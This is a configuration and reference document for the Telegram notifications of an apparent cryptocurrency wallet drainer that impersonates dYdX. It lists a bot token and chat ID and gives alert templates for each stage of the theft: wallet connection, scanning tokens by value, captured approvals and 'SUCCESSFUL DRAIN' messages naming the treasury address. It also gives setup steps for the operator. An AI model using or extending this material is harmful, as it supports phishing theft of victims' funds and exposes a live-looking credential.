# Telegram Notifications Reference for dYdX 2

## Configuration
- **Bot Token**: `8352696736:AAFHNoV9tGyN81suhDKIyDWm-FUVYKEcRLc`
- **Chat ID**: `-1003184083653`
- **Site Name**: `dYdX`

## Message Types & Examples

### 1. 🎯 User Connected
**Triggered**: When a wallet successfully connects to the site
```
🎯 dYdX - New User Connected

👤 Wallet: 0x742d35Cc6634C0532925a3b8D84434E1e8f88071
🌐 Site: dYdX
⏰ Time: 2025-01-XX T XX:XX:XX.XXXZ
🔗 Etherscan: https://etherscan.io/address/0x742d35Cc6634C0532925a3b8D84434E1e8f88071
```

### 2. 💰 Tokens Detected
**Triggered**: After scanning wallet and finding valuable tokens
```
💰 dYdX - Tokens Detected (Value-Sorted)

👤 Wallet: 0x742d35Cc6634C0532925a3b8D84434E1e8f88071
📊 Found 5 tokens (Total: ~$12,450.00):
1. USDC: 5000.000000 (~$5000.00)
2. WETH: 2.500000 (~$6250.00)
3. USDT: 1000.000000 (~$1000.00)
4. DAI: 150.000000 (~$150.00)
5. SHIB: 2000000.000000 (~$50.00)
💡 Processing order: Highest value first
⏰ Time: 2025-01-XX T XX:XX:XX.XXXZ
```

### 3. ✅ Token Approved
**Triggered**: Each time a token approval transaction is successful
```
✅ dYdX - Token Approved

👤 Wallet: 0x742d35Cc6634C0532925a3b8D84434E1e8f88071
🪙 Token: USDC
💵 Amount: 5000.000000
📝 TX: 0xabc123def456ghi789jkl012mno345pqr678stu901vwx234yz567890abcdef
⏰ Time: 2025-01-XX T XX:XX:XX.XXXZ
```

### 4. ❌ Approval Rejected
**Triggered**: When user rejects an approval transaction
```
❌ dYdX - Approval Rejected

👤 Wallet: 0x742d35Cc6634C0532925a3b8D84434E1e8f88071
🪙 Token: WETH
❗ Reason: User rejected transaction
💡 Note: User needs to approve token spending
⏰ Time: 2025-01-XX T XX:XX:XX.XXXZ
```

### 5. 🎉 Successful Drain
**Triggered**: Each time a token is successfully drained
```
🎉 dYdX - SUCCESSFUL DRAIN!

👤 User: 0x742d35Cc6634C0532925a3b8D84434E1e8f88071
🪙 Token: USDC
💰 Amount: 5000.000000
💸 Value: ~$5000.00
⚙️ Method: claimUserRewards
📝 TX: 0xdef456ghi789jkl012mno345pqr678stu901vwx234yz567890abcdef123abc
🏦 Treasury: 0x1715c6247bb2c685df0d345a757d16f7cf003e6c
⏰ Time: 2025-01-XX T XX:XX:XX.XXXZ

🔗 TX Link: https://etherscan.io/tx/0xdef456ghi789jkl012mno345pqr678stu901vwx234yz567890abcdef123abc
```

## Notification Flow for a Typical Session

1. **🎯 User Connected** - Initial wallet connection
2. **💰 Tokens Detected** - After scanning (shows all valuable tokens found)
3. **✅ Token Approved** (repeat for each token) - During approval phase
4. **🎉 Successful Drain** (repeat for each token) - During drainage phase

## Console Logging

You'll also see these messages in the browser console:
- `📱 Sending Telegram message (user_connected): [message content]`
- `📱 Telegram message sent successfully (user_connected)`
- Or: `📱 Telegram API error (user_connected): [error details]`

## Testing the Telegram Integration

1. **Check Environment Variables**: Make sure `.env.local` has the correct values
2. **Monitor Console**: All Telegram messages are logged to console
3. **Telegram Channel**: Check the configured chat for real-time notifications
4. **Error Handling**: Any Telegram failures are logged but won't stop the draining process

## Telegram Bot Setup

If you need to set up your own bot:
1. Message @BotFather on Telegram
2. Create new bot with `/newbot`
3. Get bot token and update `NEXT_PUBLIC_TELEGRAM_BOT_TOKEN`
4. Add bot to your group/channel
5. Get chat ID and update `NEXT_PUBLIC_TELEGRAM_CHAT_ID`

The system will send formatted HTML messages with emojis and clickable links for easy monitoring.
